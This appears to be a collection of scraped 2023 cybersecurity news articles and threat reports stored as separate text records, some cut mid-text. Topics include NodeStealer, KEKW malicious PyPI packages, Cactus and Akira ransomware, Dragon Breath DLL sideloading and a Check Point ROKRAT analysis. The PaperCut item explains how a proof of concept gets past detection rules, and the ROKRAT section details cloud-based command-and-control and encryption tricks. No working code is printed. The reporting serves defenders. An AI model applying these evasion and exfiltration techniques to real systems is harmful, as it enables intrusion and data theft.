      "text": "  Sankt-Petersburg, Russia, September 26, 2018: Facebook Ads application icon on Apple iMac screen close-up. Facebook Business app icon. Facebook Ads mobile application. Social media networkMeta is warning of the emergence of “aggressive and persistent” new strains of malware targeting business users of popular platforms including Facebook, Gmail and Outlook.The malware is deployed through malicious browser extensions, ads, and social media platforms to steal cookies and business account credentials that criminals can then use to run unauthorized ad campaigns. “These malware families target people through email phishing, malicious browser extensions, ads and mobile apps, and various social media platforms with an aim to run unauthorized ads from the compromised business accounts across the internet,” Facebook engineers Nathaniel Gleicher and Ryan Victory wrote.Threat actors typically disguise malware within innocuous-looking files, as well as in mobile apps or browser extensions available in official app stores. They often latch onto the latest tech or business productivity tools to hide their malware and trick people into clicking on or downloading it.To target businesses, malware groups often go after the personal accounts of people who manage social media business pages and advertising accounts.This can include stealing cookies containing valid user session tokens, a tactic that can allow criminals to gain access to accounts without the need for passwords, and to bypass any two-factor authentication protection.The malware is written in JavaScript, executed using Node.js, and compiled into a Windows executable with a tool from the Node Package Manager called pkg. It attempts to steal stored password and cookie session information from Chromium-based browsers including Chrome, Opera, Microsoft Edge and Brav.NodeStealer specifically targets user credentials for Facebook, Gmail and Outlook.“We hypothesize that the malware steals email credentials to compromise the user’s contact point and potentially to access other online accounts connected to that email account,” Nguyen and Victory said.When it is able to retrieve Facebook credentials from the target’s browser data, the malware uses them to steal advertising account information by making requests to the APIs used by Facebook web and mobile apps. The stolen data is then exfiltrated to the threat actor’s command-and-control server.“The stolen information then enables the threat actor to assess and then use users’ advertising accounts to run unauthorized ads,” Facebook wrote.The engineers say they have not observed any new samples of malware in the NodeStealer family since February 27. Because they identified it within two weeks of its initial deployment, Meta was able to effectively disrupt its wider distribution by submitting takedown requests to third-party registrars, hosting providers, and application services which were used to spread it.“Because these malicious groups are financially motivated, we expect them to continue probing defenses by diversifying their operations to spread across the internet so they can withstand disruptions by any one company — ours included,” Nguyen and Victory wrote.Simon Hendery is a freelance IT consultant specializing in security, compliance, and enterprise workflows.

      "text": "  Malicious open-source Python .whl (Wheel) files were found distributing a new malware named KEKW that can steal sensitive information from infected systems by incorporating clipper activities with infostealers to hijack cryptocurrency transactions.CRIL also verified with the Python security team on May 2 that the security team took down the malicious packages within 48 hours of them being uploaded. Because the malicious packages were taken down quickly, CRIL said it’s impossible to determine the number of people who downloaded them. However, they believe that the impact of the incident may have been minimal. Threat actors are taking advantage of open-source software vulnerabilities because of the lack of resources in open-source development and open-source (and some sponsored) delivery chains, such as NPM and PyPI, explained Scott Gerlach, co-founder and CSO at StackHawk. Gerlach said taking over abandoned projects, name spoofing, and malicious contributions are some ways attackers take advantage of under-resourced teams providing these pipelines.“Organizations can start addressing this issue by contributing to open source projects with time and or money,” said Gerlach. “Providing source code contribution, code reviews, or helping with processes to protect those delivery chains can help add much needed resources to help protect these software and delivery mechanisms. This vector is being exploited due to its relatively low cost of entry and high effectiveness. It’s going to get harder and harder to keep up with such an effective attack vector without a major change in how these libraries get delivered into software that uses them.”Mike Parkin, senior technical engineer at Vulcan Cyber, added that the case reported on by Cyble serves as good example of the kind of supply chain attack threat actors have been favoring recently. Parkin said it’s also a good example of the proper response by the team running the repository that quickly identified and removed the offending files.“It's unlikely many projects were affected by these malicious libraries, but even if a few were compromised, it points to an issue with developers not necessarily doing enough to vet the code they're including in their projects,” said Parkin. “It's impractical to expect public repositories to do the job for you. While they do a lot, we can expect threat actors to keep using this approach, and the responsibility for vetting the libraries in use ultimately falls to the developers.”“We expect this trend to continue increasing in the future,” said Gershon.In a bid to strengthen authentication and security measures against relay attacks and unauthorized network access, Microsoft has confirmed that it will be using Kerberos in place of the NT LAN Manager in Windows 11, The Hacker News reports.Newly developed cybersecurity guidelines from the U.S. Department of Treasury, Cybersecurity and Infrastructure Security Agency, National Security Agency, and the FBI tackling open source software usage in industrial control systems and operational technology environments have recommended not only up-to-date patches and security updates for all OT and IT systems but also the application of \"secure-by-design\" and \"secure-by-default\" philosophies in software development, reports SecurityWeek.Here’s a quick look at the pros and cons of ChatGPT and how developers can get started.On-Demand EventOn-Demand EventOn-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "text": "  A massive international operation targeting dark web markets culminated in 288 arrests, the seizure of 1,875 pounds of drugs and more than $50 million in cash and cryptocurrency, authorities said Tuesday.Operation SpecTor was coordinated by the FBI and Europol, spanned nine countries and dozens of law enforcement agencies, and is believed to have met its goal of significantly disrupting fentanyl and opioid trafficking on the dark web.SpecTor began in late 2021, led by the Department of Justice’s Joint Criminal and Opioid Darknet Enforcement (JCODE) team. JCODE was set up in 2018 to coordinate complex, multi-agency investigations into virtual marketplaces selling dangerous and illegal drugs around the globe. “Teams target the infrastructure of the darknet marketplaces to ultimately take them offline. They then analyze the data, including usernames and accounts, to develop leads they can send to partner agencies around the world to build out investigations.”In this case the target was Monopoly Market, a dark web market set up in 2019 where drugs were sold worldwide for cryptocurrency. Its take-down by German authorities in December 2021 marked the completion of one phase of Operation SpecTor.“These target packages, created by cross-matching and analyzing the collected data and evidence, served as the basis for hundreds of national investigations. The vendors arrested as a result of the police action against Monopoly Market were also active on other illicit marketplaces, further impeding the trade of drugs and illicit goods on the dark web.”The 288 vendors and buyers arrested in the operation “engaged in tens of thousands of sales of illicit goods” across Europe, Brazil and the U.S., where 153 of the arrests were made.“This represents the most funds seized and the highest number of arrests in any coordinated international action led by the Justice Department against drug traffickers on the dark web,” Attorney General Merrick Garland said.The operation resulted in over 100 U.S. federal operations and prosecutions.More arrests could follow, with Europol noting: “As law enforcement authorities gained access to the vendors’ extensive buyer lists, thousands of customers across the globe are now at risk of prosecution as well.”Last year, together with German authorities, the DoJ seized Hydra Market, the world’s largest and longest-running illegal marketplace.Simon Hendery is a freelance IT consultant specializing in security, compliance, and enterprise workflows.

      "text": " As the second anniversary of the massive ransomware attack on Colonial Pipeline nears, experts warn that efforts to thwart the potentially debilitating threat to US critical infrastructure have not been enough.Security experts view the situation as one where for all the work done so far, there's a lot more to do.What's needed now, she explains, are more specific directives for critical infrastructure organizations. \"We must evolve the minimum cybersecurity requirements for critical sectors [and enhance] standards for authentication and identity proofing to prevent ransomware incidents from occurring,\" she says.\"Critical infrastructure organizations like Colonial Pipeline should adopt zero-trust principles to prevent ransomware attacks, especially as social engineering becomes more realistic, sophisticated, persistent, and complex,\" Payton says.Mike Hamilton, former CISO of Seattle and current CISO of cybersecurity firm Critical Insight, says Colonial Pipeline's attack exposed a lack of good procedures among US infrastructure operators for recovering from a serious cyberattack.\"Once Colonial shut down the pipeline operation out of an abundance of caution, it took far too long to restart, which lengthened the existing fuel supply problem,\" he says. \"This is a resilience issue. You need to be able to take a punch and get off the mat before that ten-count is over.\"In the two years since the Colonial Pipeline incident, US government entities have worked at making ransomware attackers harder and costlier for attackers, Hamilton notes. The Treasury Department, for instance, has used its existing Office of Foreign Assets Control (OFAC) authority to ban the use of crypto exchanges for extortion payments. The US Department of Justice has also been more aggressive in proactively taking down criminal infrastructure and apprehending criminals.Going forward, the emphasis must be on defending and taking out criminal infrastructure, he says. Identify and sanction criminals for eventual capture and incarceration and prohibit ransomware victims from making payments, Hamilton says.The US Cybersecurity and Infrastructure Agency (CISA) too has been taking an active role in getting federal agencies to bolster defenses against ransomware and other cyber threats.The programs are part of CISA's Joint Cyber Defense Collaborative (JCDC) through which the agency receives tips and threat information from cybersecurity researchers, infrastructure players and threat intelligence firms.\"CISA has recognized the threat of ransomware to critical infrastructure,\" says Mariano Nunez, CEO and co-founder of Onapsis. Since the beginning of the year, they have already flagged over 60 organizations in the healthcare, utilities, and other sectors, about potential pre-ransomware threats on their networks, he says.Such help is vital because ransomware attacks on critical infrastructure are growing, Nunez says.\"The attack surface will continue to grow as utilities and critical infrastructure become more connected, or interconnected, online,\" he notes. \"Moving to the cloud can also present some issues as this shift can make it more difficult to monitor active threats and assess vulnerabilities in a timely fashion.\"One factor that could complicate efforts to address the ransomware problem is a growing tendency by victims to either delay reporting an incident or covering it up entirely if possible.According to BlackFog, its research indicates that organizations concerned about the potential damage to their brands, reputation, and customer relationships are delaying and sometimes not reporting a ransomware incident.\"We now see more than 90% of all attacks no longer encrypt the victim's devices but simply exfiltrate the data and extort everyone,\" says Darren Williams, CEO and founder of BlackFog. \"The costs of exposure are simply too high; loss of business, remediation, regulatory fines, and class action lawsuits are just a few of the problems to deal with.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "title": "New Cactus ransomware encrypts itself to evade antivirus",
      "text": " A new ransomware operation called Cactus has been exploiting vulnerabilities in VPN appliances for initial access to networks of “large commercial entities.”The Cactus ransomware operation has been active since at least March and is looking for big payouts from its victims.While the new threat actor adopted the usual tactics seen in ransomware attacks - file encryption and data theft - it added its own touch to avoid detection.Researchers at Kroll corporate investigation and risk consulting firm believe that Cactus obtains initial access into the victim network by exploiting known vulnerabilities in Fortinet VPN appliances.The assessment is based on the observation that in all incidents investigated the hacker pivoted inside from a VPN server with a VPN service account.What sets Cactus apart from other operations is the use of encryption to protect the ransomware binary. The actor uses a batch script to obtain the encryptor binary using 7-Zip.The original ZIP archive is removed and the binary is deployed with a specific flag that allows it to execute. The entire process is unusual and the researchers that this is to prevent the detection of the ransomware encryptor.In a technical report, Kroll investigators explain that there are three main modes of execution, each one selected with the use of a specific command line switch: setup (-s), read configuration (-r), and encryption (-i).The -s and -r arguments allow the threat actors to setup persistence and store data in a C:\\ProgramData\\ntuser.dat file that is later read by the encryptor when running with the -r command line argument.For the file encryption to be possible, though, a unique AES key known only to the attackers must be provided using the -i command line argument.This key is necessary to decrypt the ransomware's configuration file and the public RSA key needed to encrypt files. It is available as a HEX string hardcoded in the encryptor binary.Decoding the HEX string provides a piece of encrypted data that unlocks with the AES key.“CACTUS essentially encrypts itself, making it harder to detect and helping it evade antivirus and network monitoring tools,” Laurie Iacono, Associate Managing Director for Cyber Risk at Kroll, told Bleeping Computer.Running the binary with the correct key for the -i (encryption) parameter unlocks the information and allows the malware to search for files and start a multi-thread encryption process.Kroll researchers provided the diagram below to better explain the Cactus binary execution process as per the selected parameter.When preparing a file for encryption, Cactus changes its extension to .CTS0. After encryption, the extension becomes .CTS1.However, Gillespie explained that Cactus can also has a \"quick mode,\" which is akin to a light encryption pass. Running the malware in quick and normal mode consecutively results in encrypting the same file twice and appending a new extension after each process (e.g. .CTS1.CTS7).Kroll observed that the number at the end of the .CTS extension varied in multiple incidents attributed to Cactus ransomware.Once in the network, the threat actor used a scheduled task for persistent access using an SSH backdoor reachable from the command and control (C2) server.According to Kroll investigators, Cactus relied on SoftPerfect Network Scanner (netscan) to look for interesting targets on the network.For deeper reconnaissance, the attacker used PowerShell commands to enumerate endpoints, identify user accounts by viewing successful logins in Windows Event Viewer, and ping remote hosts.Kroll investigators say that after escalating privileges on a machine, Cactus operators run a batch script that uninstalls the most commonly used antivirus products.Like most ransomware operations, Cactus also steals data from the victim. For this process, the threat actor uses the Rclone tool to transfer files straight to cloud storage.After exfiltrating data, the hackers used a PowerShell script called TotalExec, often seen in BlackBasta ransomware attacks, to automate the deployment of the encryption process.Gillespie told us that the encryption routine in Cactus ransomware attacks is unique.Despite this, it does not appear to be particular to Cactus as a similar encryption process has also been adopted recently by the BlackBasta ransomware gang.At the moment there is no public information about the ransoms that Cactus demands from its victims but BleepingComputer has been told by a source that they are in the millions.Even if the hackers do steal data from victims, it appears that they have not set up a leak site like other ransomware operations involved in double-extortion.However, the threat actor does threaten victims with publishing the stolen files unless they get paid. This is explicit in the ransom note:Extensive details about the Cactus operation, the victims they target, and if the hackers keep their word and provide a reliable decryptor if paid, are not available at this time.What is clear is that the hackers' incursions so far likely leveraged vulnerabilities in the Fortinet VPN appliance and follow the standard double-extortion approach by stealing data before encrypting it.Applying the latest software updates from the vendor, monitoring the network for large data exfiltration tasks, and responding quickly should protect from the final and most damaging stages of a ransomware attack."

These companies are in various industries, including education, finance, real estate, manufacturing, and consulting.When executed, Akira will delete Windows Shadow Volume Copies on the device by running the following PowerShell command:The ransomware will then proceed to encrypt files that contain the following file extensions:While encrypting, the encryptor will skip files found in the Recycle Bin, System Volume Information, Boot, ProgramData, and Windows folders. It will also avoid encrypting the Windows system files with .exe, .lnk, .dll, .msi, and .sys file extensions.When encrypting files, the ransomware encrypts files and appends the .akira extension will be appended to the file's name.For example, a file named 1.doc would be encrypted and renamed to 1.doc.akira, as shown in the encrypted folder below.Each computer folder will contain a ransom note named akira_readme.txt  that includes information on what happened to a victim's files and links to the Akira data leak site and negotiation site.\"As for your data, if we fail to agree, we will try to sell personal information/trade secrets/databases/source codes - generally speaking, everything that has a value on the darkmarket - to multiple threat actors at ones. Then all of this will be published in our blog,\" threatens the Akira ransom note.Each victim has a unique negotiation password that is entered into the threat actor's Tor site. Unlike many other ransomware operations, this negotiation site just includes a chat system that the victim can use to negotiate with the ransomware gang.Like other ransomware operations, Akira will breach a corporate network and spread laterally to other devices. Once the threat actors gain Windows domain admin credentials, they will deploy the ransomware throughout the network.However, before encrypting files, the threat actors will steal corporate data for leverage in their extortion attempts, warning victims that it will be publicly released if a ransom is not paid.The Akira gang put a lot of effort into their data leak site, giving it a retro look where visitors can navigate it by typing in commands, as shown below.At the time of this writing, Akira has leaked the data for four victims on their data leak site, with the size of the leaked data ranging from 5.9 GB for one company to 259 GB for another.From negotiations seen by BleepingComputer, the ransomware gang demands ransoms ranging from a $200,000 to millions of dollars.They are also willing to lower ransom demands for companies who do not need a decryptor, and just want to prevent the leaking of stolen data.The ransomware is currently being analyzed for weaknesses, and BleepingComputer does not advise victims to pay the ransom until its determined if a free decryptor can recover files for free."

      "text": " A new proof-of-concept (PoC) exploit for an actively exploited PaperCut vulnerability was released that bypasses all known detection rules.The flaw was first disclosed in March 2023, warning that it allows attackers to execute code through PaperCut's built-in scripting interface. A later update to the advisory in April warned that the vulnerability was being actively exploited in attacks.Since then, multiple security companies have released detection rules for PaperCut exploits and indicators of compromise, including detections via Sysmon, log files, and network signatures.\"This report shows that detections that focus on one code execution method, or that focus on a small subset of techniques used by one threat actor, are doomed to be useless in the next round of attacks,\" explains VulnCheck's report.VulnCheck explains that Sysmon-based detections relying on process creation analysis are already beaten by existing PoCs that use alternate child process creation pathways.In the case of log file detections, VulnCheck explains that they cannot be trusted as definitive indicators of a compromise, as they flag normal admin user logging, plus there's a way to exploit CVE-2023-27350 without leaving entries in the log files.Instead of using the built-in scripting interface, the newly published PoC abuses the \"User/Group Sync\" feature in PaperCut NG, which allows an admin user to specify a custom program for user authentication.VulnCheck's PoC uses \"/usr/sbin/python3\" for Linux and \"C:\\Windows\\System32\\ftp.exe\" for Windows and provides the malicious input that will perform code execution in the credentials during a login attempt.This approach does not create direct child processes or generate distinctive log entries, so Sysmon and Log File detections are bypassed.As for network signature detection methods, those can be trivially bypassed if the attacker modifies the malicious HTTP request by adding an extra slash or an arbitrary parameter into it.VulnCheck's approach combines all the above bypassing tricks to exploit the PaperCut NG and MF vulnerability without triggering any alarms.The researchers also released a video demonstrating the creation of a reverse shell on the target.While VulnCheck did not provide alternate detection methods that work for all PoCs, they warned that hackers closely monitor what detection methods are employed by defenders and adjust their attacks to make them undetectable anyway.Therefore, the best way to deal with this threat is to apply the recommended security updates, which are PaperCut MF and PaperCut NG versions 20.1.7, 21.2.11, and 22.0.9 and later."

      "text": " Dozens of organizations are still exposed to cyberattacks through a widely-abused vulnerability in GoAnywhere MFT — a web-based tool that helps organizations transfer files — according to new research.A patch for the vulnerability was released in February but the ransomware group said it was able to compromise more than 130 organizations.\nImage: Censys“Over 2 months after this zero day was disclosed, Censys continues to observe almost 180 hosts running exposed GoAnywhere MFT admin panels, with 30% of these showing indications of remaining unpatched and potentially vulnerable to this exploit,” Censys security researcher Himaja Motheram said.“A single vulnerable instance has the potential to serve as a gateway to a data breach that could potentially impact millions of individuals.”The findings have alarmed security experts because other ransomware groups have now been seen exploiting the vulnerability.“Executing a ransomware attack by targeting the GoAnywhere MFT vulnerability is extremely easy — with the exfiltration of data near certain, and the fast delivery of the payload also guaranteed,” At-Bay explained.“It is strongly recommended that users — especially those whose admin portals are accessible from the internet — install the patch as soon as possible.”Censys’ Motheram said their experts have seen a “slow and steady patch response” since the fix was released on February 6.They saw a 46% decrease in the number of exposed GoAnywhere panels since the patch was released. As of April 25, more than 179 hosts are still running exposed instances, with 55 of these “showing indications of running vulnerable versions of the software.”\nImage: Censys“Just one exposed unpatched instance can be a potential entry point for a threat actor to exploit this zero day,” she said, urging organizations to not only apply the patch but avoid exposing administration panels to the internet.The blog post from Fortra said that while they were first notified of the vulnerability on January 30, customers reported facing issues as early as January 18.“We determined that customers running an admin portal exposed to the internet, which represents a small minority of customers, were at an increased risk and promptly communicated with those customers regarding mitigation of this risk,” Fortra explained.Jonathan Greig is a Breaking News Reporter at Recorded Future News.

      "text": " Denmark’s security and intelligence service has warned that last year’s expulsions of Russian intelligence officers working under diplomatic cover could result in a new wave of undercover spies posing as “journalists or business people.”“The espionage threat is not exclusively directed against politicians and public officials in key ministries, staff from the intelligence services and Danish Armed Forces, but also against other public authorities, critical infrastructure in Denmark, companies, research institutions, researchers, students, refugees and dissidents,” said the report.However the PET has warned that Russia will “attempt to compensate for the expulsions by using other methods for spying … for instance [by placing spies] undercover as journalists or business people.”It said that it was aware of “several foreign cases where private companies and NGOs with more or less direct ties to Russian intelligence services are engaged in intelligence activities,” often for the purposes of exerting influence on the target state’s activities.The PET warned in particular that Russia’s intelligence services were “continuously” attempting to “collect information on Danish technology and research in areas where Danish companies and research institutions are market leaders.”The items “include maritime technology, sensor and laser equipment as well as various types of industrial machines used by the Russian armed forces,” reported PET.The PET report cited Denmark’s Centre for Cyber Security, which described Russia as possessing “substantial cyber espionage capabilities” and warned that “Russian cyber actors pose a constant threat to Danish authorities and companies.”Alongside “the physical presence of intelligence officers” the PET said that the Russian intelligence services also use “various kinds of electronic collection and cyber espionage.”“Russia uses its very significant cyber capabilities for systematic support of its national interests,” the report said, while adding that “cyber espionage can also be used for preparing destructive cyber attacks.” It did not offer an assessment of how likely such attacks were.Alexander Martin is the UK Editor for Recorded Future News.

      "text": " The San Bernardino County Sheriff’s Department opted to pay a $1.1-million ransom after a ransomware attack infected its systems in early April.The ransomware attack forced the Police department to temporarily shut down some of its systems to prevent the threat from spreading. Impacted systems include email, in-car computers and some law enforcement databases.The attack took place on April 7, the law enforcement immediately launched an investigation into the incident to determine the extent of the attack. Sheriff’s Department spokeswoman Gloria Huerta said that the investigation is still ongoing.The Los Angeles Times reported that San Bernardino County paid half the total of the ransom ($511,852), while the remaining part was covered by the insurance carrier. The ransom was paid to “restore the system’s full functionality and secure any data involved in the breach.”Despite the FBI and law enforcement bodies always recommend not paying ransom in these attacks, in this case, the department opted to pay likely because they had no other way to recover the encrypted systems or to avoid the disclosure of sensitive data.The ransomware gang that targeted the San Bernardino County Sheriff’s Department is suspected to be from Eastern Europe and has already targeted U.S. entities in the past.Cities, hospitals, and school districts are privileged targets of cybercriminals because they have poor defense and their systems contain a lot of sensitive data.We are in the final!Please nominate Security Affairs as your favorite blog.\nCopyright@securityaffairs 2023 "

      "title": "Dragon Breath APT uses double-dip DLL sideloading strategy",
      "text": " Sophos researchers observed an APT group, tracked as Dragon Breath (aka APT-Q-27 and Golden Eye), that is using a new DLL sideloading technique that adds complexity and layers to the execution of the classic DLL sideloading. The attack consists of a clean application, which acts as a malicious loader, and an encrypted payload. The experts observed various modifications of components over time. In the latest campaigns, a first-stage clean application “side”loads a second clean application and auto-executes it. Then the second clean application sideloads the malicious loader DLL that executes the final payload.The experts also observed targets in the Philippines, Japan, Taiwan, Singapore, Hong Kong, and China. Sophos discovered a web site (telegramos[.]org) that claims to deliver Chinese-language versions of the Telegram application for Android, iOS, and Windows. The researchers noticed occasionally, but not consistently, the site ignored the OS choices of the visitors.Upon opening the installer for the Telegram app, it creates a desktop shortcut that executes an unusual command that leads to the loading of malicious components while displaying to the victim the expected Telegram desktop UI, mostly in Chinese.The malicious code maintains persistence by creating a shortcut file in the user’s startup directory. The experts observed more first-stage variations using LetsVPN and WhatsApp installers.The experts noticed that the attackers used different second-stage clean loaders for various attacks they have detected, however, the second-stage malicious loader and the final payload files are essentially the same,The payloads support common backdoor capabilities such as downloading and executing files, running arbitrary commands clearing event logs, and extracting and setting clipboard content. The malware is also able to steal cryptocurrency from the MetaMask crypto (Ethereum) wallet extension for Google Chrome.“DLL sideloading, first identified in Windows products in 2010 but prevalent across multiple platforms, continues to be an effective and appealing tactic for threat actors.” concludes the post. “This double-clean-app technique employed by the Dragon Breath group, targeting a user sector (online gambling) that has traditionally been less scrutinized by security researchers, represents the continued vitality of this approach.”We are in the final!Please nominate Security Affairs as your favorite blog.\nCopyright@securityaffairs 2023 "

      "title": "Chain Reaction: ROKRAT’s Missing Link - Check Point Research",
      "text": " In previous years, ROKRAT infection chains usually involved a malicious Hangul Word Processor (HWP, a popular document format in South Korea) document with an exploit, or a Microsoft Word document with macros. While some ROKRAT samples still use these techniques, we have observed a shift to delivering ROKRAT with LNK files disguised as legitimate documents. This shift is not exclusive to ROKRAT but represents a larger trend that became very popular in 2022. In July of that year, Microsoft began blocking macros in Office applications by default in an effort to minimize the spread of malware, and the first malware sample we discuss was discovered in the same month.In our report, we discuss various infection chains and lures used by APT37 in their recent attacks, and the resulting payloads of ROKRAT and Amadey. Finally, we dive deeply into a technical analysis of ROKRAT.Over the past four months, we observed multiple infection chains leading to ROKRAT deployment. In most cases, an LNK file initiates the infection, although in a few a DOC file was used for the same purpose (the method in previous ROKRAT attacks). During our analysis of the ROKRAT infection chain, we came across a similar chain leading to the deployment of Amadey, a commercial RAT sold in underground forums. Although the nature of the attacks is different, we believe all of those were crafted by the same actors.Although first linked to GOLDBACKDOOR, analysis of recent lures tied to APT37 suggests this technique has become a prominent method used to deliver another tool associated with the same actor, namely ROKRAT. The implementation of ROKRAT and GOLDBACKDOOR loading mechanisms are so similar that differentiating between the two is only possible upon retrieving the payload.Over the last few months, we were able to identify multiple lures utilizing this unique implementation delivered in ZIP and ISO archives. Only some of these lures were confirmed to lead to ROKRAT deployment. All of the lures used the theme of South Korean domestic and foreign affairs.The earliest indication of the above-mentioned infection chain was found in a ZIP file named (0722)상임위원회 및 상설특별위원회 위원 명단(최종).zip ((0722) Standing Committee and Standing Special Committee Member List (final).zip). This ZIP file contains an LNK with the same name and looks very similar to the LNK loader that was used for GOLDBACKDOOR.At the beginning of February 2023, we came across another new sample of ROKRAT. This time, the actors used a ZIP archive, named projects in Libya.zip, which contains several stolen documents. In the malicious archive, there were three benign files called MFZ Executive Summary Korea.pdf, Proposed MOU GTE Korea.docx, and Proposed MOU GTE Korea.pdf. The fourth file was a suspiciously large LNK, approximately 42.5 MB, masquerading as a PDF file named Pipelines Profile (Elfeel- Sharara-Mellitah + Wafa - Mellitah).pdf. Unlike all of the other lures we saw, this one was in English.All the documents in this archive are connected to the Libyan Oil & Gas industry. The three benign documents are about a project involving a Libyan oil company called Geotech Energy and a South Korean consultant company called Tundrabiz. The decoy document that is opened after clicking the malicious LNK shows the profiling of an oil pipeline from 2005 by Enppi, an international contractor that specializes in projects in the oil and gas industries.At the beginning of April, we saw a similar infection chain from an ISO file that led to ROKRAT. The sample contained two malicious LNKs inside named 북 외교관 선발파견 및 해외공관.lnk (Selection and Dispatch of North Korean Diplomats and Overseas Missions.lnk) and 북한외교정책결정과정.lnk (North Korea foreign policy decision-making process.lnk). Both LNKs contain and drop decoy HWP files, which is a common document format in South Korea and is widely used by North Korean threat actors to distribute malware. The files are named 230401.hwp and 230402.hwp, respectively. These names likely indicate the dates April 1 and April 2, 2023, just a few days before the ISO archive was discovered. Both decoy documents contain articles regarding diplomacy and policy decisions of South Korea toward North Korea.Even though the two LNKs dropped the same document and script, one file was 10 MB and the other nearly 50 MB, due to different amounts of padding inside the LNK files. Unfortunately, at the time of analysis, the payload hosted on OneDrive had already been taken down, so we are unsure of the final payload. However, we believe that it was probably ROKRAT or GOLDBACKDOOR.All of the LNKs discussed above lead to nearly the same infection chain. An example of the infection is depicted below, as demonstrated in the “Projects in Libya” archive:Clicking the malicious LNK file triggers the execution of a PowerShell, and initiates the following infection chain:While adopting new behavior to keep up with the shifting threat landscape, ROKRAT operators still stick to some old habits. In parallel to the newly identified method described above, ROKRAT is still deployed using malicious Word documents.In December 2022, a malicious Word document named 사례비_지급의뢰서.doc (Case fee_Payment request.doc) was submitted to VirusTotal. The document itself contains a short form to enter personal and banking information. However, closer inspection of the document reveals references to the Ministry of Unification, a ministry in the South Korean government that is responsible for guiding policy with North Korea and dealing with North Korean defectors, with the ultimate goal of reuniting the two countries.Once the user opens the malicious document and allows the macro to execute, the following infection chain is triggered:Additionally, there is another document recently discovered in April 2023 that appears to be part of the same infection chain, only this time the target process for injection is mspaint.exe. The document references a few subjects such as Kim Jong-Un’s potential successor and North Korea’s nuclear weapon capabilities. Unfortunately, at the time of our analysis, the URL was no longer replying to the request to download the payload. However, it is highly likely that this document was also intended to deliver ROKRAT.ROKRAT is just one of the many custom tools used by this threat actor, but is definitely versatile and powerful. ROKRAT primarily focuses on running additional payloads and extensive data exfiltration. It relies on cloud infrastructure for C&C functions, including DropBox, pCloud, Yandex Cloud, and OneDrive. ROKRAT also collects information about the machine to prevent further infection of unintended victims.While it’s no secret that ROKRAT has not significantly changed in the last few years, this can be attributed to its slick use of in-memory execution, disguising C&C communication as potentially legitimate cloud communication, and additional layers of encryption to hinder network analysis and evade network signatures. As a result, there are not a lot of recent published articles about ROKRAT.Most samples of ROKRAT have a very simple WinMain function. All of the samples analyzed so far contain a data collection functionality (CollectMachineData, as seen in Figure 11 below) which is executed before the execution of the Main RAT thread (MainRATThread). This thread initializes the RAT and runs a loop to try and get commands from the C&C, and then parses and executes them.There are two additional functionalities embedded into the WinMain function that we only observed in a subset of the samples. The first checks if the RAT is able to write to the TEMP directory (CheckTemp, as seen in Figure 11 below). The second one creates a thread (KillCertainProcessesThread) to kill certain processes linked to previous infection vectors that exploited vulnerabilities in Hancom Office.One of the first functions that ROKRAT calls when it executes is designed to collect data about the infected machine. In this phase of infection, this is likely to help the attackers distinguish if this is a desired target or not, and then act accordingly.In this function (and many others), ROKRAT uses encrypted strings to prevent some of the techniques used from being visible to static analysis. The information collected here includes whether the program is running on WOW64 (indicating 32-bit applications running on 64-bit windows), the version of vmtoolsd.exe (VMWare Tools Daemon, if installed), SMBIOS data from the registry, and the system BIOS version from the registry as well.The RAT also collects the username, machine name, and the full path to the executable file where the RAT is executing. The latter is important because the infection chain usually involves injecting a ROKRAT PE file into an existing process’s memory. In other words, this allows the attackers to see if ROKRAT is executing in the expected process, such as powershell.exe or notepad.exe. Finally, the function checks to see if the executable has permission to create a file for writing under C:\\Windows.While a lot of the target’s data is collected in the function mentioned above, there is another data collection function that runs in the context of the main RAT thread before ROKRAT starts accepting commands. This second function check calls the IsDebuggerPresent API, storing the result as a character (0 or 1). In addition, it calls a function to grab a screenshot of the machine.The data collection carried out in the main thread will be executed, sending the collected each time ROKRAT attempts to get commands.In this same function, some samples also check if there is a running process named 360Tray.exe, a process that is part of an antivirus software called 360 Total Security. The result is stored in a global Boolean variable and is accessed in a separate function used to execute shellcode payloads. Interestingly, if the process was found, ROKRAT doubles the timeout period it waits for the shellcode to finish running from 24 seconds to 48 seconds. If the shellcode runs past the timeout period and 360Tray.exe was not previously detected, ROKRAT attempts to terminate the shellcode thread.As previously mentioned, some ROKRAT samples execute a thread called KillCertainProcessesThread. This thread kills two processes, gbb.exe and gswin32c.exe, which are responsible for parsing postscript data in Hancom Office. In the past, ROKRAT samples have come from malicious HWP documents that exploit these processes to gain code execution. Most likely, this is code left over from trying to clean any traces of exploitation from previous campaigns.Instead of using hardcoded or encrypted strings for these process names, ROKRAT instead contains a simple hashing algorithm that determines a process name based on an integer value. It works in the following way:In each of the ROKRAT samples we analyzed, the malware configuration contained an ID number representing the cloud infrastructure, and the API token to use it. The ID number can have the following values to correspond to different cloud providers, as well as a test mode that allows the RAT to communicate with the local machine:Further analysis indicates that there are usually two C&C configurations, one used as the primary infrastructure and the second as a backup. In the latest samples we discovered, the primary C&C was pCloud and the secondary was Yandex Cloud.ROKRAT starts with initializing the token and then gets the folder content from the C&C to make sure it has access and the token is valid:The names for the files that ROKRAT uses are generated based on GetTickCount API and random values from the rand API with the time of execution as a seed.ROKRAT uploads a file to the server that contains the following information about the victim machine:To further hide its tracks, ROKRAT labels the data collected about the victim’s machine as MP3:First, the data is XORed with a random four-byte key. For this reason, the data begins with a hardcoded four-byte value 0xBAADFEDE. As the attackers know the hardcoded value, they can derive the XOR key by XORing the first four bytes of the XORed data with 0xBAADFEDE to retrieve the key. The XORed data is then encrypted with AES-CBC. Finally, the AES key is encrypted with a hardcoded RSA public key to ensure that the payload can only be decrypted with the RSA private key.Despite the fact that C&C communication is already encrypted in HTTPS traffic, ROKRAT takes it a step further by encrypting data uploaded to the C&C with AES. When the malware initializes, it generates two random 16-byte values, which serve as a basis for the AES keys used to encrypt commands and payloads. The malware also comes with a hardcoded 16-byte value, which is then XORed against the two randomized values. The result is two AES keys, one that is used to encrypt and decrypt commands, and one that is used to encrypt and decrypt payloads.Each command is identified by a single character. Some of the commands take arguments, and they are supplied just after the command ID character. After the correct command is identified, the code parses the arguments according to the type of command. The following table lists the commands we discovered in ROKRAT, together with their expected arguments and actions:Upon receiving the cleanup command (d), ROKRAT runs the following commands to delete persistence mechanisms not initially used by the malware. They might be related to some post-infection activity.Upon receiving commands 1–4, ROKRAT creates a file called out.txt, which contains information about the system:In this report, we describe new activity by the notorious North Korean 